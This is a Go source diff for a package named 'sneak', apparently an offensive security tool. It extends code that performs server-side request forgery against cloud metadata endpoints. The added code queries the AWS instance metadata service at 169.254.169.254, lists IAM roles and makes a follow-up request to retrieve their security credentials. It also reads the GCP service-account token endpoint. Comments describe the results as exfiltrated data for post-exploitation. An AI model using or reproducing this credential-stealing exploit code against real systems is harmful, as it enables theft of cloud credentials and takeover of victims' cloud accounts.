@@ -1,14 +1,17 @@
 package sneak
 
 import (
-	"errors"
 	"fmt"
+	"io/ioutil"
 	"net/http"
 	"time"
 )
 
 // All cloud metadata endpoints we support to perform SSRF against
 type MetadataEndpoints map[string]*CloudSsrf
+
+// Exfiltrated information that we can use for post-exploitation
+type SsrfResults map[string]string
 
 type CloudSsrf struct {
 	// HTTP client to interact with endpoints
@@ -30,10 +33,7 @@ type CloudSsrf struct {
 	Paths map[string]string
 
 	// Callback to consume the current check being done and process it from the response
-	PostProcessor func(check string, resp *http.Response) error
-
-	// Stores information that we've exfiltrated from an SSRF attack
-	Finalized map[string]string
+	PostProcessor func(check string, url string, resp *http.Response) (string, error)
 }
 
 // Checks if the endpoint for the provider is reachable, in order to confirm that
@@ -69,14 +69,17 @@ func (c *CloudSsrf) CheckLitmus() bool {
 }
 
 // Once it's confirmed that we can reach the endpoint let's exfiltrate
-func (c *CloudSsrf) Exploit() error {
+func (c *CloudSsrf) Exploit() SsrfResults {
+	results := SsrfResults{}
+
+	// to remain reliable, if a check fails, we'll log and skip
 	for check, endpoint := range c.Paths {
 		fmt.Printf("Running `%s`\n", check)
 
 		url := c.Actual + "/" + endpoint
 		req, err := http.NewRequest("GET", url, nil)
 		if err != nil {
-			return err
+			continue
 		}
 
 		if c.Headers != nil {
@@ -88,19 +91,21 @@ func (c *CloudSsrf) Exploit() error {
 		// execute and prepare to parse response
 		resp, err := c.Client.Do(req)
 		if err != nil {
-			return err
+			continue
 		}
 		if resp.StatusCode != 200 {
-			return errors.New("cannot reach the API endpoint during exploitation")
+			continue
 		}
 
-		// use the postprocessor callback to appropriately handle the response and
-		// parse out juicy information for us
-		//c.Finalized[check] = c.PostProcessor(check, resp)
-	}
+		// we'll refrain from actually parsing the body in anyway other than string conversion
+		info, err := c.PostProcessor(check, endpoint, resp)
+		if err != nil {
+			continue
+		}
 
-	// we couldn't process anything for some reason
-	return nil
+		results[check] = info
+	}
+	return results
 }
 
 func GetMetadataEndpoints() MetadataEndpoints {
@@ -109,18 +114,50 @@ func GetMetadataEndpoints() MetadataEndpoints {
 		Timeout: time.Duration(2 * time.Second),
 	}
 	return map[string]*CloudSsrf{
+
+		// TODO: deal with aws_imdsv2
 		"aws": &CloudSsrf{
 			Client:   &client,
 			Endpoint: []string{"http://169.254.169.254"},
 			Litmus:   "/latest/",
 			Headers:  nil,
 			Paths: map[string]string{
-				"hostname": "/latest/meta-data/hostname",
-				"token":    "/latest/meta-data/iam/",
+				"hostname":   "/latest/meta-data/hostname",
+				"ami-id":     "/latest/meta-data/ami-id",
+				"meta_token": "/latest/meta-data/iam/security-credentials/",
+				"user_token": "/latest/user-data/iam/security-credentials/",
 			},
-			PostProcessor: func(check string, resp *http.Response) error {
-				// TODO
-				return nil
+			PostProcessor: func(check string, url string, resp *http.Response) (string, error) {
+				body, err := ioutil.ReadAll(resp.Body)
+				if err != nil {
+					return "", err
+				}
+
+				// we need to determine what roles are available and then make an additional request
+				if check == "meta_token" || check == "user_token" {
+
+					// new request to now retrieve sensitive credentials
+					url := url + "/" + string(body)
+					req, err := http.NewRequest("GET", url, nil)
+					if err != nil {
+						return "", err
+					}
+
+					tokenResp, err := client.Do(req)
+					if err != nil {
+						return "", err
+					}
+
+					// stringify the AWS IAM credentials we retrieved and return
+					tokens, err := ioutil.ReadAll(tokenResp.Body)
+					if err != nil {
+						return "", err
+					}
+					return string(tokens), nil
+				}
+
+				// just return the body as a string for everything else
+				return string(body), nil
 			},
 		},
 		"gcp": &CloudSsrf{
@@ -138,30 +175,12 @@ func GetMetadataEndpoints() MetadataEndpoints {
 				// TODO: is `default` always going to be the case for service accounts?
 				"token": "/computeMetadata/v1/instance/service-accounts/default/token",
 			},
-			PostProcessor: func(check string, resp *http.Response) error {
-
-				/*
-					// there's quite a lot here, so we won't try to iteratively parse through,
-					// and instead just return everything as a string
-					if check == "all" {
-						body, err := ioutil.ReadAll(resp.Body)
-						if err != nil {
-							return nil
-						}
-						return string(body)
-
-					} else if check == "token" {
-
-						var tokenResponse struct {
-							AccessToken string `json:"access_token"`
-							TokenType   string `json:"token_type"`
-							ExpiresIn   int    `json:"expires_in"`
-						}
-
-					}
-					return nil
-				*/
-				return nil
+			PostProcessor: func(check string, url string, resp *http.Response) (string, error) {
+				body, err := ioutil.ReadAll(resp.Body)
+				if err != nil {
+					return "", err
+				}
+				return string(body), nil
 			},
 		},
 		/*
